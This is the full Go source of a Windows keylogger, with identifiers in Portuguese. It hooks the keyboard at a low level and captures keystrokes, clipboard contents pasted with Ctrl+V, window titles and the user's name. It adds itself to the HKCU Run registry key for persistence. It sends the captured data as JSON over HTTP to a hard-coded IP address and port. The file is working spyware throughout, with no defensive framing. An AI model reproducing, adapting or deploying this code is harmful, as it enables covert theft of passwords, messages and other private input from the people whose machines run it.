package main

import (
	"bytes"
	"encoding/json"
	"log"
	"net"
	"net/http"
	"os"
	"os/user"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var (
	windowsdll             = windows.NewLazyDLL("user32.dll")
	estadoTecla            = windowsdll.NewProc("GetKeyState")
	estadoTeclado          = windowsdll.NewProc("GetKeyboardState")
	formatoTeclado         = windowsdll.NewProc("GetKeyboardLayout")
	ToUnicodeEx            = windowsdll.NewProc("ToUnicodeEx")
	cancelarHook           = windowsdll.NewProc("UnhookWindowsHookEx")
	chamarProximaHook      = windowsdll.NewProc("CallNextHookEx")
	setarHook              = windowsdll.NewProc("SetWindowsHookExW")
	janelaAtual            = windowsdll.NewProc("GetForegroundWindow")
	pegarMensagem          = windowsdll.NewProc("GetMessageW")
	abrirClipboard         = windowsdll.NewProc("OpenClipboard")
	pegarDadosClipboard    = windowsdll.NewProc("GetClipboardData")
	fecharClipboard        = windowsdll.NewProc("CloseClipboard")
	kernel32               = windows.NewLazyDLL("kernel32.dll")
	procGlobalLock         = kernel32.NewProc("GlobalLock")
	procGlobalUnlock       = kernel32.NewProc("GlobalUnlock")
	pegarTamanhoNomeJanela = windowsdll.NewProc("GetWindowTextLengthW")
	pegarTextoJanela       = windowsdll.NewProc("GetWindowTextW")


	
	dadosJsonNafuncao byte
	canalFilaEnvio = make(chan Payload, 100)
	c             = make(chan string, 1000)
	hook          HHOOK
	msg           MSG
	conexaoGlobal net.Conn
	checarJanela  = 0
	textoFinal string
)

type Payload struct {
	Janela string `json:"janela"`
	Teclas string `json:"teclas"`
	Usuario string `json:"usuario"`
}


const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	WM_KEYUP       = 0x0101
	VK_SHIFT       = 0x10
	VK_MENU        = 0x12
	VK_CONTROL     = 0x11
	CF_UNICODETEXT = 13
)

type HHOOK uintptr

type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

type MSG struct {
	Hwnd    uintptr
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      struct{ X, Y int32 }
}

func LerClipboard() string {
	err, _, _ := abrirClipboard.Call()
	if err == 0 {
		return ""
	}

	defer fecharClipboard.Call()

	handle, _, _ := pegarDadosClipboard.Call(uintptr(CF_UNICODETEXT))
	ponteiroMemoria, _, _ := procGlobalLock.Call(handle)
	if ponteiroMemoria == 0 {
		return ""
	}

	defer procGlobalUnlock.Call(handle)
	dados := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(ponteiroMemoria)))
	return dados
}

func envioHTTPrequest() {
	for dados := range canalFilaEnvio{
		client := &http.Client{}
		url := "http://100.71.54.28:3456"
		jsondata, err :=  json.Marshal(dados)
		if err != nil {
			log.Println("Erro ao converter JSON:", err)
			return
		}
		reqbody := bytes.NewBuffer([]byte(jsondata))
		resp,err := client.Post(url, "application/json", reqbody)
		if err != nil {
			log.Println("Erro ao enviar HTTP:", err)
			continue
		}

		resp.Body.Close()
	}	
}

func NomeJanela(hwnd uintptr) string {
	textLen, _, _ := pegarTamanhoNomeJanela.Call(hwnd)

	buf := make([]uint16, int(textLen)+1)
	pegarTextoJanela.Call(
		uintptr(hwnd),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(textLen+1))

	return syscall.UTF16ToString(buf)
}

func callbackKey(nCode int32, wParam uintptr, lParam uintptr) uintptr {
	if nCode < 0 {
		ret, _, _ := chamarProximaHook.Call(uintptr(hook), uintptr(nCode), wParam, lParam)
		return ret
	}

	tecladoStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))

	teclado := make([]byte, 256)
	caractere := make([]uint16, 3)

	estadoTecla.Call(VK_SHIFT)
	estadoTecla.Call(VK_MENU)
	ctrlpressionado, _, _ := estadoTecla.Call(VK_CONTROL)
	estadoTeclado.Call(uintptr(unsafe.Pointer(&teclado[0])))

	formato, _, _ := formatoTeclado.Call(0)

	ToUnicodeEx.Call(uintptr(tecladoStruct.VkCode), uintptr(tecladoStruct.ScanCode), uintptr(unsafe.Pointer(&teclado[0])), uintptr(unsafe.Pointer(&caractere[0])), uintptr(len(caractere)-1), uintptr(tecladoStruct.Flags), formato)

	caractereString := syscall.UTF16ToString(caractere)

	isCtrlPressed := ctrlpressionado & 0x8000 != 0

	usuario, err := user.Current()
	if err != nil {
		ret, _, _ := chamarProximaHook.Call(uintptr(hook), uintptr(nCode), wParam, lParam)
		return ret
	}
	nomeUsuario := usuario.Name
	switch wParam {
	case WM_KEYDOWN:

		if tecladoStruct.VkCode == 13 {
			janela, _, _ := janelaAtual.Call()
			nomejanela := NomeJanela(janela)

			c <- "\n"
			var acumulador strings.Builder
			for len(c) > 0 {
				acumulador.WriteString(<-c)	
			}
			textoFinal = acumulador.String()
			if len(textoFinal) > 1 {
				select {
				case canalFilaEnvio <- Payload{Janela: nomejanela, Teclas: textoFinal, Usuario: nomeUsuario}:
				default:

				}
			}

		} else if tecladoStruct.VkCode == 32 {
			c <- " "
		} else if tecladoStruct.VkCode == 8 {
			c <- "[backspace]"
		} else if tecladoStruct.VkCode == 9 {
			c <- "[tab]"

		} else if tecladoStruct.VkCode == 86 {
			if isCtrlPressed {
				texto := LerClipboard()
				c <- texto
			}
		} else if len(caractereString) > 0 {
			c <- caractereString
		}

		if len(c) == cap(c) -1  && conexaoGlobal != nil {
			janela, _, _ := janelaAtual.Call()
			nomejanela := NomeJanela(janela)
			var acumulador strings.Builder
			c <- "\n"
			for len(c) > 0 {
				acumulador.WriteString(<-c)	
			}
			textoFinal = acumulador.String()
			if len(textoFinal) > 1 {
				select {
				case canalFilaEnvio <- Payload{Janela: nomejanela, Teclas: textoFinal, Usuario: nomeUsuario}:
				default:

				}
			}
		}
		
	}

	ret, _, _ := chamarProximaHook.Call(uintptr(hook), uintptr(nCode), wParam, lParam)
	return ret
}

func main() {
	var err error
	//Persistencia
	chave,_,err := registry.CreateKey(registry.CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", registry.SET_VALUE) 

	if err != nil {
		log.Fatal(err)
	}

	defer chave.Close()	

	PATH, _  := os.Executable() 

	err = chave.SetStringValue("teclado", PATH)
	if err != nil {
		log.Fatal(err)
	}

	//envioHTTP
	go envioHTTPrequest()


	//HOOK de teclado
	callback := syscall.NewCallback(callbackKey)

	temp, _, _ := setarHook.Call(WH_KEYBOARD_LL, callback, 0, 0)

	hook = HHOOK(temp)

	if hook == 0 {
		return
	}

	defer cancelarHook.Call(uintptr(hook))

	for {
		ret, _, _ := pegarMensagem.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)

		if int32(ret) <= 0 {
			break
		}
	}

}